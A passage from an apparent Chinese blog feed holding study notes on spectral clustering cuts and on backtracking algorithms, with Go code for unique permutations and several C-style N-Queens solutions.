class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1477389999999998em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">∣</span><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord accent mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9467699999999999em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.9523300000000003em;"><span class="pstrut" style="height:2.7em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord mtight">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>具体做法：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623161755.png" alt="image.png|650"><br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623161806.png" alt="image.png|650"><br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623161820.png" alt="image.png|650"><br> 其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>r</mi><mo stretchy="false">(</mo><msup><mi>H</mi><mi>T</mi></msup><mi>L</mi><mi>H</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">tr(H^T LH)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mclose">)</span></span></span></span> 为矩阵的迹。（看不懂，下一个）</p><h2 id="ncut切图">NCut切图</h2><p>由于子图样本的个数多并不一定权重就大，我们切图时基于权重也更合我们的目标，因此一般来说Ncut切图优于RatioCut切图。</p><p>NCut切图和RatioCut切图很相似，就是把分母换掉：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623162127.png" alt="image.png|525"><br>同时NCut的指示向量也做了修改：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623162156.png" alt="image.png|650"><br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623162210.png" alt="image.png|650"><br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623162226.png" alt="image.png|650"><br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623162237.png" alt="image.png|625"></p><h2 id="算法基本流程">算法基本流程</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240623162328.png" alt="image.png|900"></p><p>注：本文参考自课程ppt</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回溯算法</title>
      <link href="/20240ebc85fb2749/"/>
      <url>/20240ebc85fb2749/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p><code>回溯算法</code>属于暴力搜索法的一种，它是一种可以找到所有（或一部分）解的一般性算法。尤其适用于约束满足问题，在搜索过程中逐步构造候选解，并在确定某一些候选解不可能正确时放弃继续搜索，转而继续搜索并构造其他候选解。</p><p><code>八皇后问题</code>就是一个经典的可以使用回溯法的例子。在使用回溯法解决八皇后问题时，每一步都尝试选择某一行的皇后，在到达某一行后发现无法再继续构造下去，就会直接放弃，进行回溯，继续从上层选择其他的决策，尝试构造其他的摆放方式。在选择出一个完整解后（搜索到最底层行），将其放入答案序列，然后结束算法，或者继续回溯，尝试找到其他可行解。</p><h1 id="示例">示例</h1><h2 id="找出二叉树的所有值为7的节点-返回节点列表">找出二叉树的所有值为7的节点，返回节点列表</h2><p>题目：找出二叉树的所有值为7的节点，并返回节点列表</p><p>深搜遍历即可，略。。。</p><h2 id="在二叉树中搜索所有值为7的节点-返回根节点到这些节点的路径">在二叉树中搜索所有值为7的节点，返回根节点到这些节点的路径</h2><p>同样深搜即可，并将路径上的结点压栈，找到结点后将栈作为路径序列返回即可。</p><h2 id="在二叉树中搜索所有值为7的节点-返回根节点到这些节点的路径-并要求路径中不包含值为-3-的节点">在二叉树中搜索所有值为7的节点，返回根节点到这些节点的路径，并要求路径中不包含值为 3 的节点</h2><p>同样深搜即可，并将路径上的结点压栈，如果遇到值为3的结点则提前返回（剪枝），舍弃之后的路径，在找到值为7的结点后将栈作为路径序列返回即可。</p><h1 id="回溯法主体框架">回溯法主体框架</h1><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621183451.png" alt="image.png"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621183511.png" alt="image.png"></p><h1 id="回溯法的优点与局限">回溯法的优点与局限</h1><p>本质上是一种深度优先搜索算法，它尝试所有可能的解决方案直到找到满足条件的解</p><p>优点：</p><ul><li>能够找到所有可能的解决方案</li><li>在合理的剪枝操作下，具有很高的效率</li></ul><p>缺点：</p><ul><li>处理大规模或者复杂问题时，回溯算法的运行效率可能难以接受：<ul><li>回溯算法通常需要遍历状态空间的所有可能，时间复杂度可以达到指数阶或阶乘阶</li><li>在递归调用中需要保存当前的状态，当深度很大时，空间需求可能会变得很大</li></ul></li></ul><p>优化方式：</p><ul><li>剪枝：避免搜索那些肯定不会产生解的路径，从而节省时间和空间</li><li>启发式搜索：在搜索过程中引入一些策略或者估计值，从而优先搜索最有可能产生有效解的路径</li></ul><h1 id="经典例题">经典例题</h1><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621184242.png" alt="image.png"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621191033.png" alt="image.png"></p><h2 id="全排列问题">全排列问题</h2><p>题目：在给定一个集合（如一个数组或字符串）的情况下，找出其中元素的所有可能的排列。</p><h3 id="无相等元素的情况">无相等元素的情况</h3><p>输入一个整数数组，其中不包含重复元素，返回所有可能的排列</p><p>使用一个标记数组（或者哈希表）select来让每一个元素只被选择一次，每一层都进行数组的迭代即可</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621191321.png" alt="image.png"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621191329.png" alt="image.png"></p><h3 id="有相等元素的情况">有相等元素的情况</h3><p>输入一个整数数组，数组中可能包含重复元素，返回所有不重复的排列</p><p>最直接的解决办法是引入一个哈希表，直接对结果进行去重，但是并没有对搜索过程进行优化，需要考虑其他方法进行剪枝。</p><p>解决办法是，在每一层都引入一个哈希表duplicated，对数组中的每种相同值的元素（而不是每一个元素）做映射，相同值的元素根据该哈希表，在当前层只会有其中一个被选择，这样就避免了重复，代码如下：</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621193037.png" alt="image.png"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621193048.png" alt="image.png"></p><p>额外：Go代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">permuteUnique</span><span class="params">(nums []<span class="type">int</span>)</span></span> [][]<span class="type">int</span> &#123;  </span><br><span class="line">    <span class="keyword">var</span> result [][]<span class="type">int</span>  </span><br><span class="line">    <span class="keyword">var</span> temp []<span class="type">int</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> visit = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">bool</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> backtrack <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span>  </span><br><span class="line">    backtrack = <span class="function"><span class="keyword">func</span><span class="params">(start <span class="type">int</span>)</span></span> &#123;  </span><br><span class="line">       <span class="comment">// 如果递归到达最底层，添加排列到结果中  </span></span><br><span class="line">       <span class="keyword">if</span> start == <span class="built_in">len</span>(nums) &#123;  </span><br><span class="line">          result = <span class="built_in">append</span>(result, <span class="built_in">append</span>([]<span class="type">int</span>(<span class="literal">nil</span>), temp...)) <span class="comment">// 复制temp  </span></span><br><span class="line">          <span class="keyword">return</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">       used := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">bool</span>)  </span><br><span class="line">       <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(nums); i++ &#123;  </span><br><span class="line">          <span class="keyword">if</span> _, ok := visit[i]; ok &#123;  </span><br><span class="line">             <span class="keyword">continue</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">          <span class="keyword">if</span> _, ok := used[nums[i]]; ok &#123;  </span><br><span class="line">             <span class="keyword">continue</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">          used[nums[i]] = <span class="literal">true</span>  </span><br><span class="line">          visit[i] = <span class="literal">true</span>  </span><br><span class="line">          temp = <span class="built_in">append</span>(temp, nums[i])  </span><br><span class="line">          backtrack(start + <span class="number">1</span>)  </span><br><span class="line">          temp = temp[:<span class="built_in">len</span>(temp)<span class="number">-1</span>]  </span><br><span class="line">          <span class="built_in">delete</span>(visit, i)  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    backtrack(<span class="number">0</span>)  </span><br><span class="line">    <span class="keyword">return</span> result  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    nums := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>&#125;  </span><br><span class="line">    permutations := permuteUnique(nums)  </span><br><span class="line">    <span class="keyword">for</span> _, perm := <span class="keyword">range</span> permutations &#123;  </span><br><span class="line">       fmt.Println(perm)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回顾一下，两个哈希表（标记数组也被理解成哈希表也没什么问题，键为下标，值为bool值）select和duplicated的区别：</p><ul><li>select用于记录在当前状态的整个搜索过程所选择的元素下标不会重复，具有一定的全局性，即每一轮选择之间是共享同一个select</li><li>而duplicated则是每轮（每层）选择中独有的，目的是解决当前轮次重复值元素的选择问题</li></ul><h2 id="子集和问题">子集和问题</h2><h3 id="无重复元素-可以选择多次">无重复元素，可以选择多次</h3><p>问题：给定一个正整数数组 nums 和一个目标正整数 target ，请找出所有可能的组合，使得组合中的元素和等于 target 。给定数组无重复元素，每个元素可以被选取多次。请以列表形式返回这些组合，列表中不应包含重复组合</p><p>参考全排列，把子集的生成过程看做一系列选择的结果，并且在选择过程中实时更新元素和，当元素和等于 target 时就将子集记录至结果列表。</p><p>需要注意的是，本问题中每个元素可以无限次选取，因此无需使用 select 数组进行标记。<br>另一方面，由于给定的数组 nums 中的元素均为正整数，因此如果找到了一个合适的解，直接回溯即可，因为继续累加是没有意义的。</p><p>进一步，如果直接修改全排列问题的代码，会出现重复的问题，因为结果子集各元素是不关心顺序的，因此会出现 <code>[4,5]</code>和<code>[5,4]</code>这样的重复结果。</p><p>当然，可以在最后去重，但是效率极低：</p><ul><li>数组元素较多时，特别是在 target 很大时，重复子集的数量会非常大</li><li>去重时，需要排序，然后逐个比较，效率低下</li></ul><p>为了更高效地去重，尝试在搜索过程中进行剪枝。很容易发现，重复子集是由于子集中各个元素在原数组的下标顺序并不是严格递增的，例如如果有原数组 <code>[3,4,5]</code>，那么应该是 <code>idx[3]&lt;idx[4]&lt;idx[5]</code>，因此 <code>[4,5]</code> 满足条件；而 <code>[5,4]</code> 则不满足，将其剪枝：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621194539.png" alt="image.png"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621194551.png" alt="image.png"></p><p>为了实现这种剪枝，使用一个 start 值记录每轮选择的起始下标，这样就能避免下标顺序错误的问题。代码如下：</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621194644.png" alt="image.png"></p><h3 id="有重复元素-但只能选择一次">有重复元素，但只能选择一次</h3><p>问题：给定一个正整数数组 nums 和一个目标正整数 target ，请找出所有可能的组合，使得组合中的元素和等于 target 。给定数组可能包含重复元素，每个元素只可被选择一次。请以列表形式返回这些组合，列表中不应包含重复组合。</p><p>解决方法比较巧妙：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621195249.png" alt="image.png"></p><p>注：ppt中做法的”设定下一轮从索引i+1开始“可能有点问题，因为可能重复的元素不止出现两次，可能出现3次以上，这时不能简单地+1。我的想法：预处理一个哈希表next，记录每个值对应的下一个访问的起始下标：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621195440.png" alt="image.png|425"><br>（未实践，回头再说）</p><p>ppt的代码貌似使用一个continue的跳转进行去重（剪枝四）：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240621195616.png" alt="image.png"></p><h2 id="n皇后问题">N皇后问题</h2><p>略，有若干方法，直接深搜即可</p><p>贴一些自己的方法，C语言写的：</p><p>位运算法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_N 51</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ull;</span><br><span class="line"><span class="type">int</span> n, sum, flag, ans[MAX_N];</span><br><span class="line">ull col, dia1, dia2;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> step, ull col, ull dia1, ull dia2)</span> &#123; <span class="comment">//step为行</span></span><br><span class="line"><span class="keyword">if</span> (step == n + <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &lt; <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, ans[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">flag++;</span><br><span class="line">&#125;</span><br><span class="line">sum++;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> bits = (~(col | dia1 | dia2)) &amp; ((<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> bit;</span><br><span class="line"><span class="keyword">while</span> (bits) &#123;</span><br><span class="line">bit = bits &amp; -bits;</span><br><span class="line">ans[step] = log2(bit) + <span class="number">1</span>;</span><br><span class="line">dfs(step + <span class="number">1</span>, col | bit, (dia1 | bit) &lt;&lt; <span class="number">1</span>, (dia2 | bit) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">ans[step] = <span class="number">0</span>;</span><br><span class="line">bits = bits &amp; (bits - <span class="number">1</span>); <span class="comment">// bits ^= bit; //(?)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">dfs(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; sum;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对角线数列映射法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_N 51</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> n, sum, flag, col[MAX_N + <span class="number">1</span>], dia1[MAX_N * <span class="number">2</span>], dia2[MAX_N * <span class="number">2</span>], ans[MAX_N + <span class="number">1</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> step)</span> &#123; <span class="comment">//step为行</span></span><br><span class="line"><span class="keyword">if</span> (step == n + <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (flag &lt; <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, ans[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">flag++;</span><br><span class="line">&#125;</span><br><span class="line">sum++;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123; <span class="comment">//i为列</span></span><br><span class="line"><span class="keyword">if</span> (col[i] + dia1[i - step + n] + dia2[i + step - <span class="number">1</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">col[i] = dia1[i - step + n] = dia2[i + step - <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">ans[step] = i;</span><br><span class="line">dfs(step + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">col[i] = dia1[i - step + n] = dia2[i + step - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// cout&lt;&lt;step&lt;&lt;endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">dfs(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; sum;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对角线方程法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_N 51</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> n, sum, flag, ans[MAX_N];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> step)</span> &#123; <span class="comment">//step为行</span></span><br><span class="line">    <span class="keyword">if</span> (step == n + <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//if (flag &lt; 3) &#123;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, ans[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        flag++;</span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">        sum++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="type">bool</span> flag2 = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (step == <span class="number">1</span>) &#123;</span><br><span class="line">            ans[step] = i;</span><br><span class="line">            dfs(step + <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; step; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (((i + step == ans[j] + j) || (i - step == ans[j] - j) || (i == ans[j]))) &#123;</span><br><span class="line">                    flag2 = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (flag2) &#123;</span><br><span class="line">                ans[step] = i;</span><br><span class="line">                dfs(step + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    dfs(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; sum;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：本文参考自课程ppt</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 回溯算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>贪心算法续</title>
      <link href="/20247d091ae2ee37/"/>
      <url>/20247d091ae2ee37/</url>
      
